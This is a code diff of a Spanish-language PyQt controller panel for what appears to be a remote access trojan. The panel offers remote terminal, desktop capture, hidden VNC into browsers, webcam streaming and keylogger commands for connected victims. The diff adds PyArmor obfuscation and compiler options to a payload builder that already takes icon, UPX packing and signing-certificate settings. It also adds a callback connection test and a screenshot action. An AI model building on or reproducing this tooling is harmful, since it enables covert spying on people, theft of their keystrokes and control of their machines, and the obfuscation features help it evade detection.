@@ -31,6 +31,7 @@ VK_ESPECIALES = {
     Qt.Key.Key_Down: 0x28, Qt.Key.Key_Home: 0x24, Qt.Key.Key_End: 0x23,
 }
 
+
 class TerminalDialog(QDialog):
     def __init__(self, cid, nombre, parent=None):
         super().__init__(parent)
@@ -67,6 +68,7 @@ class TerminalDialog(QDialog):
     def append_respuesta(self, t):
         self.output.appendPlainText(t)
         self.output.appendPlainText("")
+
 
 class EscritorioDialog(QDialog):
     def __init__(self, cid, nombre, parent=None):
@@ -107,7 +109,8 @@ class EscritorioDialog(QDialog):
         self.timer = QTimer(self)
         self.timer.timeout.connect(self._tick_captura)
         self.timer.start(300)
-        QTimer.singleShot(150, self._tick_captura)   # <-- primer frame al abrir
+        QTimer.singleShot(150, self._tick_captura)
+
     def _tick_captura(self):
         if not self.chk_captura.isChecked():
             return
@@ -190,6 +193,7 @@ class EscritorioDialog(QDialog):
         except ValueError:
             pass
         super().closeEvent(e)
+
 
 class HvncDialog(QDialog):
     NAVEGADORES = ["chrome", "edge", "brave", "opera", "firefox"]
@@ -355,6 +359,7 @@ class HvncDialog(QDialog):
             pass
         super().closeEvent(e)
 
+
 class WebcamDialog(QDialog):
     def __init__(self, cid, nombre, parent=None):
         super().__init__(parent)
@@ -394,6 +399,7 @@ class WebcamDialog(QDialog):
         except ValueError:
             pass
         super().closeEvent(e)
+
 
 class MainWindow(QMainWindow):
     _sig_log = pyqtSignal(str)
@@ -462,8 +468,6 @@ class MainWindow(QMainWindow):
         self.in_puerto_srv = QLineEdit(str(self.servidor.puerto))
         self.in_puerto_srv.setFixedWidth(70)
         tl.addWidget(self.in_puerto_srv)
-        def _guardar_config(self):
-           config.guardar(self.in_bhost.text().strip(), self.in_bpuerto.text().strip())
         tl.addStretch()
         self.btn_servidor = QPushButton("▶  Iniciar servidor")
         self.btn_servidor.setStyleSheet(ESTILO_BOTON)
@@ -737,14 +741,17 @@ class MainWindow(QMainWindow):
         self.btn_ddns.setStyleSheet(ESTILO_BOTON)
         self.btn_ddns.clicked.connect(lambda: self.in_bhost.setText(config.cargar()["host"]))
         form.addWidget(self.btn_ddns, 0, 3)
-        
+
         form.addWidget(self.btn_ip_pub, 0, 2)
         form.addWidget(QLabel("Puerto:"), 1, 0)
         self.in_bpuerto = QLineEdit(str(cfg["puerto"]))
         self.in_bpuerto.setFixedWidth(90)
         form.addWidget(self.in_bpuerto, 1, 1, Qt.AlignmentFlag.AlignLeft)
+        self.btn_probar = QPushButton("Probar")
+        self.btn_probar.setStyleSheet(ESTILO_BOTON)
+        self.btn_probar.clicked.connect(self._probar_conexion)
+        form.addWidget(self.btn_probar, 1, 2, 1, 2)
         l.addLayout(form)
-        # guarda automáticamente al salir del campo
         self.in_bhost.editingFinished.connect(self._guardar_config)
         self.in_bpuerto.editingFinished.connect(self._guardar_config)
 
@@ -767,6 +774,18 @@ class MainWindow(QMainWindow):
         self.in_bupx = QLineEdit()
         form2.addWidget(self.in_bupx, 2, 1, 1, 3)
         l.addLayout(form2)
+
+        form3 = QHBoxLayout()
+        form3.addWidget(QLabel("Compilador:"))
+        self.in_bcomp = QComboBox()
+        self.in_bcomp.addItems(["pyinstaller", "auto", "nuitka"])
+        self.in_bcomp.setToolTip("pyinstaller = rapido (sin compilar C) | auto = Nuitka si esta | nuitka = forzar")
+        form3.addWidget(self.in_bcomp)
+        self.chk_pyarmor = QCheckBox("Ofuscar con PyArmor")
+        self.chk_pyarmor.setChecked(True)
+        form3.addWidget(self.chk_pyarmor)
+        form3.addStretch()
+        l.addLayout(form3)
 
         grid = QGridLayout()
         botones = [
@@ -942,6 +961,8 @@ class MainWindow(QMainWindow):
             ("📂  Listar directorio", lambda: self._pedir_y(cid, "listar_dir", "Ruta", ".")),
             ("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos")),
             ("🖼  Captura", lambda: self._enviar_comando(cid, "captura")),
+            ("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid)),
+            ("🖱  Cambiar botones del ratón (swap)", lambda: self._enviar_comando(cid, "swap_raton")),
             ("📷  Webcam en vivo", lambda: self._abrir_webcam(cid)),
             ("⌨️  Keylogger iniciar", lambda: self._enviar_comando(cid, "keylogger_iniciar")),
             ("📜  Keylogger leer", lambda: self._enviar_comando(cid, "keylogger_leer")),
@@ -961,12 +982,12 @@ class MainWindow(QMainWindow):
         m.exec(self.tree.viewport().mapToGlobal(pos))
 
     def _enviar_comando(self, cid, cmd, args=None):
-        if cid in self.clientes:
-            self.servidor.enviar_comando(cid, cmd, args or {})
-            if cmd not in ("raton", "teclado", "ping", "hvnc_raton",
-                           "hvnc_captura",("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid)),
-            ("🖱  Cambiar botones del ratón (swap)", lambda: self._enviar_comando(cid, "swap_raton")), "webcam_frame"):
-                self._log(f"[→] '{cmd}' a {cid[:8]}")
+        if cid not in self.clientes:
+            return
+        self.servidor.enviar_comando(cid, cmd, args or {})
+        if cmd not in ("raton", "teclado", "ping",
+                       "hvnc_raton", "hvnc_captura", "webcam_frame"):
+            self._log(f"[→] '{cmd}' a {cid[:8]}")
 
     def _pedir_y(self, cid, cmd, etiqueta, defecto):
         texto, ok = QInputDialog.getText(self, cmd, etiqueta + ":", text=defecto)
@@ -1225,6 +1246,8 @@ class MainWindow(QMainWindow):
 
     # ------------------------------------------------------------------
     def _hacer_constructor(self):
+        comp = self.in_bcomp.currentText() if hasattr(self, "in_bcomp") else "pyinstaller"
+        pyarmor = self.chk_pyarmor.isChecked() if hasattr(self, "chk_pyarmor") else False
         return Constructor(
             self.in_bhost.text().strip(),
             self.in_bpuerto.text().strip() or self.servidor.puerto,
@@ -1233,7 +1256,9 @@ class MainWindow(QMainWindow):
             icono=self.in_bicono.text().strip() or None,
             upx=self.in_bupx.text().strip() or None,
             certificado=self.in_bcert.text().strip() or None,
-            contrasena_cert=self.in_bpass.text() or None)
+            contrasena_cert=self.in_bpass.text() or None,
+            compilador=comp,
+            usar_pyarmor=pyarmor)
 
     def _guardar_config(self):
         try:
@@ -1254,6 +1279,21 @@ class MainWindow(QMainWindow):
             except Exception as e:
                 self._sig_builder.emit(f"[builder] no pude detectar IP pública: {e}")
         threading.Thread(target=worker, daemon=True).start()
+
+    def _probar_conexion(self):
+        import socket
+        host = self.in_bhost.text().strip()
+        try:
+            p = int(self.in_bpuerto.text().strip() or self.servidor.puerto)
+        except Exception:
+            p = self.servidor.puerto
+        def worker():
+            try:
+                s = socket.create_connection((host, p), timeout=5); s.close()
+                self._sig_builder.emit(f"[builder] OK: {host}:{p} responde")
+            except Exception as e:
+                self._sig_builder.emit(f"[builder] FALLO {host}:{p}: {e}")
+        threading.Thread(target=worker, daemon=True).start()    
 
     def _build_todo(self):
         c = self._hacer_constructor()
